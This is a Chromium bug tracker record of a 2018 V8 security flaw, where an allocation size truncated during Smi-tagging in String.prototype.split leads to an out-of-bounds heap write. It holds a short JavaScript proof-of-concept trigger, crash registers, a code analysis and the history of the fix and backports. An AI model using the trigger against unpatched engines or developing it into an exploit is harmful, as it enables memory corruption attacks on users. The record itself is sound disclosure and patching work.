# Security: V8 Incorrect type cast in String.p.split function leads to OOB write

| Field | Value |
|-------|-------|
| **Issue ID** | [40091536](https://issues.chromium.org/issues/40091536) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ch...@gmail.com |
| **Assignee** | jg...@chromium.org |
| **Created** | 2018-06-01 |
| **Bounty** | $5,000.00 |

## Description

This vulnerability exists in 64-bit v8 in the String.p.slit CSA code. The allocation size is stored in int64 but improperly casted to smi which causes the allocated space too small and OOB write. It may potentially lead to remote code execution.

POC  

var str2 = String.fromCharCode(0x2c);//add `,` into single character string cache  

var o2 = new Array(0x20000000);  

String.prototype.split.call(o2,'');

CRASH LOG  

When the release version crashes, the registers and nearby assembly code are as follows.  

[─────────────────────────────────────REGISTERS─────────────────────────────────────]  

\*RAX 0xffffffff <-- large offset  

\*RBX 0xc789cc82801 ◂— 0xff00000c789cc828 <-- value we can partially control  

RCX 0x14e781f02201 ◂— 0xc789cc823 <-- points to a FixedArray  

RDX 0xbd5f161fe3430800  

RDI 0x20  

RSI 0x1  

R8 0x9fb0e203439 ◂— 0xc789cc823  

R9 0x2c  

R10 0x7fff309962d8 ◂— 0x0  

R11 0x1  

R12 0x309cad302201 ◂— 0x300000c789cc82b  

R13 0x55d1aba3f478 —▸ 0xc789cc82ba9 ◂— 0xc789cc822  

R14 0x0  

R15 0x7fff309962d0 —▸ 0x7fff309962d8 ◂— 0x0  

RBP 0x7fff30996368 —▸ 0x7fff309963d0 —▸ 0x7fff309963f8 —▸ 0x7fff30996460 ◂— ...  

RSP 0x7fff309962d8 ◂— 0x0  

\*RIP 0x2b7d8e092d8a ◂— mov qword ptr [rax + rcx], rbx  

[──────────────────────────────────────DISASM───────────────────────────────────────]  

0x2b7d8e092d74 cmp rax, 0xf  

0x2b7d8e092d78 je 0x2b7d8e091e4d

0x2b7d8e092d7e mov rbx, qword ptr [r13 - 0x58]  

0x2b7d8e092d82 mov rcx, qword ptr [rbp - 0x40]  

0x2b7d8e092d86 sub rax, 8  

► 0x2b7d8e092d8a mov qword ptr [rax + rcx], rbx <-- OOB Write here!!  

0x2b7d8e092d8e cmp rax, 0xf  

0x2b7d8e092d92 jne 0x2b7d8e092d86

If it is Debug version, it will crash in the DCHECK code.

# 

# Fatal error in ../../src/heap/heap-inl.h, line 178

# Debug check failed: large\_object.

# 

# 

# 

#FailureMessage Object: 0x7ffee72a7da0  

==== C stack trace ===============================

```
0   libv8_libbase.dylib                 0x000000010f1decde v8::base::debug::StackTrace::StackTrace() + 30  
1   libv8_libbase.dylib                 0x000000010f1ded45 v8::base::debug::StackTrace::StackTrace() + 21  
2   libv8_libplatform.dylib             0x000000010f27202f v8::platform::(anonymous namespace)::PrintStackTrace() + 223  
3   libv8_libbase.dylib                 0x000000010f1a4069 V8_Fatal(char const\*, int, char const\*, ...) + 841  
4   libv8_libbase.dylib                 0x000000010f1a350a v8::base::(anonymous namespace)::DefaultDcheckHandler(char const\*, int, char const\*) + 74  
5   libv8_libbase.dylib                 0x000000010f1a4122 V8_Dcheck(char const\*, int, char const\*) + 50  
6   libv8.dylib                         0x000000010abb3510 v8::internal::Heap::AllocateRaw(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) + 2912  
7   libv8.dylib                         0x000000010acab5a6 v8::internal::Heap::AllocateRawWithLigthRetry(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) + 390  
8   libv8.dylib                         0x000000010acabb18 v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) + 408  
9   libv8.dylib                         0x000000010abab4ff v8::internal::Factory::NewFillerObject(int, bool, v8::internal::AllocationSpace) + 383  
10  libv8.dylib                         0x000000010bd83cb0 v8::internal::__RT_impl_Runtime_AllocateInTargetSpace(v8::internal::Arguments, v8::internal::Isolate\*) + 2192  
11  libv8.dylib                         0x000000010bd82ee3 v8::internal::Runtime_AllocateInTargetSpace(int, v8::internal::Object\*\*, v8::internal::Isolate\*) + 771  
12  ???                                 0x00007ed4b8233cc4 0x0 + 139452087483588  

```

Received signal 4 <unknown> 00010f1d4ce6

**VULNERABILITY DETAILS**  

In the String.p.slipt function, the StringToArray function is called if the second parameter is an empty string

TNode<JSArray> StringBuiltinsAssembler::StringToArray(  

TNode<Context> context, TNode<String> subject\_string,  

TNode<Smi> subject\_length, TNode<Number> limit\_number) {  

//...

TNode<Int32T> instance\_type = LoadInstanceType(subject\_string);  

GotoIfNot(IsOneByteStringInstanceType(instance\_type), &call\_runtime);

// Try to use cached one byte characters.  

{  

// Go to fast path  

TNode<Smi> length\_smi =  

Select<Smi>(TaggedIsSmi(limit\_number),  

[=] { return SmiMin(CAST(limit\_number), subject\_length); },  

[=] { return subject\_length; });  

TNode<IntPtrT> length = SmiToIntPtr(length\_smi);

```
ToDirectStringAssembler to_direct(state(), subject_string);  
to_direct.TryToDirect(&call_runtime);  
TNode<FixedArray> elements = AllocateFixedArray(  
    PACKED_ELEMENTS, length, AllocationFlag::kAllowLargeObjectAllocation);  

```

Because it is OneByteString, it will call AllocateFixedArray to allocate elements, code of AllocateFixedArray is as follows.

TNode<FixedArray> CodeStubAssembler::AllocateFixedArray(  

ElementsKind kind, Node\* capacity, ParameterMode mode,  

AllocationFlags flags, SloppyTNode<Map> fixed\_array\_map) {  

Comment("AllocateFixedArray");  

CSA\_SLOW\_ASSERT(this, MatchesParameterMode(capacity, mode));  

CSA\_ASSERT(this, IntPtrOrSmiGreaterThan(capacity,  

IntPtrOrSmiConstant(0, mode), mode));  

TNode<IntPtrT> total\_size = GetFixedArrayAllocationSize(capacity, kind, mode);

if (IsDoubleElementsKind(kind)) flags |= kDoubleAlignment;  

// Allocate both array and elements object, and initialize the JSArray.  

Node\* array = Allocate(total\_size, flags);

totol\_size calculated by GetFixedArrayAllocationSize is 0x100000008, then call Allocate function, and then call AllocateRawDoubleAligned function, AllocateRaw function. The partial code of AllocateRaw function is as follows.

if (flags & kAllowLargeObjectAllocation) {  

Label next(this);  

GotoIf(IsRegularHeapObjectSize(size\_in\_bytes), &next);

```
Node\* runtime_flags = SmiConstant(  
    Smi::FromInt(AllocateDoubleAlignFlag::encode(needs_double_alignment) |  
                 AllocateTargetSpace::encode(AllocationSpace::LO_SPACE)));  
Node\* const runtime_result =  
    CallRuntime(Runtime::kAllocateInTargetSpace, NoContextConstant(),  
                SmiTag(size_in_bytes), runtime_flags);  

```

IsRegularHeapObjectSize (size\_in\_bytes) returns true, and then call the Runtime function AllocateInTargetSpace, but the second parameter uses SmiTag for type conversion, SmiTag code is as follows

TNode<Smi> CodeStubAssembler::SmiTag(SloppyTNode<IntPtrT> value) {  

int32\_t constant\_value;  

if (ToInt32Constant(value, constant\_value) && Smi::IsValid(constant\_value)) {  

return SmiConstant(constant\_value);  

}  

return BitcastWordToTaggedSigned(WordShl(value, SmiShiftBitsConstant()));  

}

Although the function ToInt32Constant has a value range for determining value, it is not safe to call BitcastWordToTaggedSigned after this function. After the conversion, the size becomes 0x8 (smi). Finally, object is allocated in the LargeObjectSpace. However, the allocated space is obviously too small, and it will cause an out-of-bounds write when the Array elements are initialized which may leads to remote code execution.

## Attachments

- [poc.js](attachments/poc.js) (text/plain, 150 B)
- [v8.patch](attachments/v8.patch) (application/octet-stream, 1.4 KB)

## Timeline

### cl...@chromium.org (2018-06-01)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6295446331588608.

### cl...@chromium.org (2018-06-01)

Detailed report: https://clusterfuzz.com/testcase?key=6295446331588608

Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN WRITE
Crash Address: 0x7e9251403000
Crash State:
  v8::internal::Invoke
  v8::internal::CallInternal
  v8::internal::Execution::Call
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=53259:53260

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6295446331588608

See https://github.com/google/clusterfuzz-tools for more information.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.


### me...@chromium.org (2018-06-01)

Only CL in regression range: https://chromium.googlesource.com/v8/v8/+/b4ebbc57a9481c18757eb7f0569226772a7795d5

jgruber: Can you PTAL as the reviewer of that CL?

[Monorail components: Blink>JavaScript]

### sh...@chromium.org (2018-06-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-02)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-06-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-03)

[Empty comment from Monorail migration]

### cw...@gmail.com (2018-06-04)

Thanks for catching this!

I think we should make an OOM error at AllocateFixedArray.

### jg...@chromium.org (2018-06-04)

+ishell, this is a general issue in CSA::AllocateRaw. size_in_bytes is passed in as a UintPtr, but later smi-tagged before calling into runtime. Smi-tagging may truncate size_in_bytes, and return a smaller memory area than expected by the caller.

String.p.split is one attack vector, but I assume there are others.

I'd propose fixing this in two steps:

1. CSA_CHECK that size_in_bytes fits into a Smi & backmerge this at least to 68. AFAIK the policy is not to backmerge to stable unless we've regressed, which is not the case here (this bug is pretty old).

2. Replace the CSA_CHECK by a call to FatalProcessOutOfMemory [0].

[0] https://cs.chromium.org/chromium/src/v8/src/api.cc?l=327&rcl=9b39cfe022a85a3e9bdd08d27bac7365ceb6208e

### jg...@chromium.org (2018-06-04)

Fix in flight: https://crrev.com/c/1084930/

### jg...@chromium.org (2018-06-04)

Setting alarm to verify canary coverage.

### bu...@chromium.org (2018-06-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/515cc07d28879265d08ab540b570ebfda75f7322

commit 515cc07d28879265d08ab540b570ebfda75f7322
Author: jgruber <jgruber@chromium.org>
Date: Mon Jun 04 16:26:57 2018

[csa] Ensure the requested allocation size fits in a Smi

In CSA::AllocateRaw, ensure that the given allocation size fits into a
Smi.

Bug: chromium:848672
Cq-Include-Trybots: luci.chromium.try:linux_chromium_rel_ng
Change-Id: I4e74791296163188b1ca77cae8226a9833fba8ef
Reviewed-on: https://chromium-review.googlesource.com/1084930
Reviewed-by: Yang Guo <yangguo@chromium.org>
Reviewed-by: Igor Sheludko <ishell@chromium.org>
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Cr-Commit-Position: refs/heads/master@{#53495}
[modify] https://crrev.com/515cc07d28879265d08ab540b570ebfda75f7322/src/code-stub-assembler.cc
[modify] https://crrev.com/515cc07d28879265d08ab540b570ebfda75f7322/src/code-stub-assembler.h
[modify] https://crrev.com/515cc07d28879265d08ab540b570ebfda75f7322/test/cctest/test-code-stub-assembler.cc
[modify] https://crrev.com/515cc07d28879265d08ab540b570ebfda75f7322/test/mkgrokdump/mkgrokdump.status


### bu...@chromium.org (2018-06-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/137ff440388cc1ac1941dbb4386e23c59f65bddd

commit 137ff440388cc1ac1941dbb4386e23c59f65bddd
Author: Deepti Gandluri <gdeepti@chromium.org>
Date: Mon Jun 04 18:30:50 2018

Revert "[csa] Ensure the requested allocation size fits in a Smi"

This reverts commit 515cc07d28879265d08ab540b570ebfda75f7322.

Reason for revert: Tree closed on mkgrokdump failures
https://logs.chromium.org/v/?s=chromium%2Fbb%2Fclient.v8%2FV8_Mac64%2F22277%2F%2B%2Frecipes%2Fsteps%2FCheck%2F0%2Flogs%2Fmkgrokdump%2F0
https://logs.chromium.org/v/?s=chromium%2Fbb%2Fclient.v8%2FV8_Linux64%2F24882%2F%2B%2Frecipes%2Fsteps%2FCheck_-_noavx%2F0%2Flogs%2Fmkgrokdump%2F0
https://logs.chromium.org/v/?s=chromium%2Fbb%2Fclient.v8%2FV8_Win64%2F24413%2F%2B%2Frecipes%2Fsteps%2FCheck%2F0%2Flogs%2Fmkgrokdump%2F0

Original change's description:
> [csa] Ensure the requested allocation size fits in a Smi
> 
> In CSA::AllocateRaw, ensure that the given allocation size fits into a
> Smi.
> 
> Bug: chromium:848672
> Cq-Include-Trybots: luci.chromium.try:linux_chromium_rel_ng
> Change-Id: I4e74791296163188b1ca77cae8226a9833fba8ef
> Reviewed-on: https://chromium-review.googlesource.com/1084930
> Reviewed-by: Yang Guo <yangguo@chromium.org>
> Reviewed-by: Igor Sheludko <ishell@chromium.org>
> Commit-Queue: Jakob Gruber <jgruber@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#53495}

TBR=yangguo@chromium.org,jgruber@chromium.org,ishell@chromium.org

Change-Id: I4d1019c03b393c1a59e5eca558d9cd26ce63e17a
No-Presubmit: true
No-Tree-Checks: true
No-Try: true
Bug: chromium:848672
Cq-Include-Trybots: luci.chromium.try:linux_chromium_rel_ng
Reviewed-on: https://chromium-review.googlesource.com/1085647
Reviewed-by: Deepti Gandluri <gdeepti@chromium.org>
Commit-Queue: Deepti Gandluri <gdeepti@chromium.org>
Cr-Commit-Position: refs/heads/master@{#53496}
[modify] https://crrev.com/137ff440388cc1ac1941dbb4386e23c59f65bddd/src/code-stub-assembler.cc
[modify] https://crrev.com/137ff440388cc1ac1941dbb4386e23c59f65bddd/src/code-stub-assembler.h
[modify] https://crrev.com/137ff440388cc1ac1941dbb4386e23c59f65bddd/test/cctest/test-code-stub-assembler.cc
[modify] https://crrev.com/137ff440388cc1ac1941dbb4386e23c59f65bddd/test/mkgrokdump/mkgrokdump.status


### bu...@chromium.org (2018-06-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/8e8638c31963fe81d19dbb280d0b714970c8ce90

commit 8e8638c31963fe81d19dbb280d0b714970c8ce90
Author: jgruber <jgruber@chromium.org>
Date: Tue Jun 05 08:50:38 2018

Reland "[csa] Ensure the requested allocation size fits in a Smi"

This is a reland of 515cc07d28879265d08ab540b570ebfda75f7322

Original change's description:
> [csa] Ensure the requested allocation size fits in a Smi
>
> In CSA::AllocateRaw, ensure that the given allocation size fits into a
> Smi.
>
> Bug: chromium:848672
> Cq-Include-Trybots: luci.chromium.try:linux_chromium_rel_ng
> Change-Id: I4e74791296163188b1ca77cae8226a9833fba8ef
> Reviewed-on: https://chromium-review.googlesource.com/1084930
> Reviewed-by: Yang Guo <yangguo@chromium.org>
> Reviewed-by: Igor Sheludko <ishell@chromium.org>
> Commit-Queue: Jakob Gruber <jgruber@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#53495}

TBR=yangguo@chromium.org,ishell@chromium.org

Bug: chromium:848672
Change-Id: I135868390784a0ee95ff42224dd00f66f3bf2d80
Cq-Include-Trybots: luci.chromium.try:linux_chromium_rel_ng
Reviewed-on: https://chromium-review.googlesource.com/1086828
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Reviewed-by: Igor Sheludko <ishell@chromium.org>
Reviewed-by: Jakob Gruber <jgruber@chromium.org>
Cr-Commit-Position: refs/heads/master@{#53512}
[modify] https://crrev.com/8e8638c31963fe81d19dbb280d0b714970c8ce90/src/code-stub-assembler.cc
[modify] https://crrev.com/8e8638c31963fe81d19dbb280d0b714970c8ce90/src/code-stub-assembler.h
[modify] https://crrev.com/8e8638c31963fe81d19dbb280d0b714970c8ce90/test/cctest/test-code-stub-assembler.cc
[modify] https://crrev.com/8e8638c31963fe81d19dbb280d0b714970c8ce90/tools/v8heapconst.py


### cl...@chromium.org (2018-06-06)

ClusterFuzz has detected this issue as fixed in range 53511:53512.

Detailed report: https://clusterfuzz.com/testcase?key=6295446331588608

Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN WRITE
Crash Address: 0x7e9251403000
Crash State:
  v8::internal::Invoke
  v8::internal::CallInternal
  v8::internal::Execution::Call
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=53259:53260
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=53511:53512

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6295446331588608

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-06-06)

ClusterFuzz testcase 6295446331588608 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2018-06-06)

[Empty comment from Monorail migration]

### jg...@chromium.org (2018-06-07)

Canary seems good, requesting merge for #14.

### sh...@chromium.org (2018-06-07)

This bug requires manual review: Reverts referenced in bugdroid comments after merge request.
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), kariahda@(iOS), bhthompson@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-06-07)

This bug requires manual review: Request affecting a post-stable build
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@chromium.org (2018-06-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-07)

Good for 67, though it will only be picked up if there's another respin. Thanks!

### bu...@chromium.org (2018-06-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/3767d5a55c5cdb06026bffbe441ca1dc3657d436

commit 3767d5a55c5cdb06026bffbe441ca1dc3657d436
Author: jgruber <jgruber@chromium.org>
Date: Fri Jun 08 09:12:36 2018

Merged: Reland "[csa] Ensure the requested allocation size fits in a Smi"

This is a reland of 515cc07d28879265d08ab540b570ebfda75f7322

Original change's description:
> [csa] Ensure the requested allocation size fits in a Smi
>
> In CSA::AllocateRaw, ensure that the given allocation size fits into a
> Smi.
>
> Bug: chromium:848672
> Cq-Include-Trybots: luci.chromium.try:linux_chromium_rel_ng
> Change-Id: I4e74791296163188b1ca77cae8226a9833fba8ef
> Reviewed-on: https://chromium-review.googlesource.com/1084930
> Reviewed-by: Yang Guo <yangguo@chromium.org>
> Reviewed-by: Igor Sheludko <ishell@chromium.org>
> Commit-Queue: Jakob Gruber <jgruber@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#53495}

TBR=yangguo@chromium.org,ishell@chromium.org

No-Try: true
No-Presubmit: true
No-Treechecks: true
Bug: chromium:848672
Change-Id: I135868390784a0ee95ff42224dd00f66f3bf2d80
Cq-Include-Trybots: luci.chromium.try:linux_chromium_rel_ng
Reviewed-on: https://chromium-review.googlesource.com/1086828
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Reviewed-by: Igor Sheludko <ishell@chromium.org>
Reviewed-by: Jakob Gruber <jgruber@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#53512}
Reviewed-on: https://chromium-review.googlesource.com/1092492
Cr-Commit-Position: refs/branch-heads/6.7@{#88}
Cr-Branched-From: 8457e810efd34381448d51d93f50079cf1f6a812-refs/heads/6.7.288@{#2}
Cr-Branched-From: e921be5c4f2c6407936bde750992dedbf47c1016-refs/heads/master@{#52547}
[modify] https://crrev.com/3767d5a55c5cdb06026bffbe441ca1dc3657d436/src/code-stub-assembler.cc
[modify] https://crrev.com/3767d5a55c5cdb06026bffbe441ca1dc3657d436/src/code-stub-assembler.h
[modify] https://crrev.com/3767d5a55c5cdb06026bffbe441ca1dc3657d436/test/cctest/test-code-stub-assembler.cc


### bu...@chromium.org (2018-06-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/3bb4face4df13e3f28e7c14d9aea9195b8519b71

commit 3bb4face4df13e3f28e7c14d9aea9195b8519b71
Author: jgruber <jgruber@chromium.org>
Date: Fri Jun 08 09:13:38 2018

Merged: Reland "[csa] Ensure the requested allocation size fits in a Smi"

This is a reland of 515cc07d28879265d08ab540b570ebfda75f7322

Original change's description:
> [csa] Ensure the requested allocation size fits in a Smi
>
> In CSA::AllocateRaw, ensure that the given allocation size fits into a
> Smi.
>
> Bug: chromium:848672
> Cq-Include-Trybots: luci.chromium.try:linux_chromium_rel_ng
> Change-Id: I4e74791296163188b1ca77cae8226a9833fba8ef
> Reviewed-on: https://chromium-review.googlesource.com/1084930
> Reviewed-by: Yang Guo <yangguo@chromium.org>
> Reviewed-by: Igor Sheludko <ishell@chromium.org>
> Commit-Queue: Jakob Gruber <jgruber@chromium.org>
> Cr-Commit-Position: refs/heads/master@{#53495}

TBR=yangguo@chromium.org,ishell@chromium.org

No-Try: true
No-Presubmit: true
No-Treechecks: true
Bug: chromium:848672
Change-Id: I135868390784a0ee95ff42224dd00f66f3bf2d80
Cq-Include-Trybots: luci.chromium.try:linux_chromium_rel_ng
Reviewed-on: https://chromium-review.googlesource.com/1086828
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Reviewed-by: Igor Sheludko <ishell@chromium.org>
Reviewed-by: Jakob Gruber <jgruber@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#53512}
Reviewed-on: https://chromium-review.googlesource.com/1092494
Cr-Commit-Position: refs/branch-heads/6.8@{#21}
Cr-Branched-From: 44d7d7d6b1041b57644400a00cb3fee35f6c51b2-refs/heads/6.8.275@{#1}
Cr-Branched-From: 5754f66f75136dc17b4c63fec84f31dfdb89186e-refs/heads/master@{#53286}
[modify] https://crrev.com/3bb4face4df13e3f28e7c14d9aea9195b8519b71/src/code-stub-assembler.cc
[modify] https://crrev.com/3bb4face4df13e3f28e7c14d9aea9195b8519b71/src/code-stub-assembler.h
[modify] https://crrev.com/3bb4face4df13e3f28e7c14d9aea9195b8519b71/test/cctest/test-code-stub-assembler.cc
[modify] https://crrev.com/3bb4face4df13e3f28e7c14d9aea9195b8519b71/tools/v8heapconst.py


### jg...@chromium.org (2018-06-08)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-12)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-12)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-15)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-06-15)

Thanks chinaxiaozhouzhou@! The VRP panel decided to award $5,000 for this report.

### aw...@chromium.org (2018-06-15)

[Empty comment from Monorail migration]

### da...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### of...@google.com (2018-07-17)

Adding nodejs-backport-done label as the merge to 6.7/6.8 covers the affected Node.js versions.

### sh...@chromium.org (2018-09-12)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2019-01-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/ba712bf89f849e84e1faa2fbc0b99aca4bf42433

commit ba712bf89f849e84e1faa2fbc0b99aca4bf42433
Author: Jakob Gruber <jgruber@chromium.org>
Date: Wed Jan 09 10:08:39 2019

[csa] Call FatalProcessOutOfMemory in OOM situations

OOMs in CSA code would trigger fairly arbitrary assertion failures on
some paths. This changes CSA::AllocateRaw to call
FatalProcessOutOfMemory (just like runtime methods).
CSA::AllocateFixedArray additionally checks for
FixedArray::kMaxLength.

This increases overall builtin code size on x64 release by 28K / 2.5%.

Bug: chromium:917561, chromium:848672
Change-Id: I757271264f396e0df8d8fe0570bad078075c27d5
Reviewed-on: https://chromium-review.googlesource.com/c/1400414
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
Cr-Commit-Position: refs/heads/master@{#58654}
[modify] https://crrev.com/ba712bf89f849e84e1faa2fbc0b99aca4bf42433/src/code-stub-assembler.cc
[modify] https://crrev.com/ba712bf89f849e84e1faa2fbc0b99aca4bf42433/src/code-stub-assembler.h
[modify] https://crrev.com/ba712bf89f849e84e1faa2fbc0b99aca4bf42433/src/runtime/runtime-internal.cc
[modify] https://crrev.com/ba712bf89f849e84e1faa2fbc0b99aca4bf42433/src/runtime/runtime.h


### aw...@google.com (2019-05-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-05)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-05)

This issue was migrated from crbug.com/chromium/848672?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091536)*
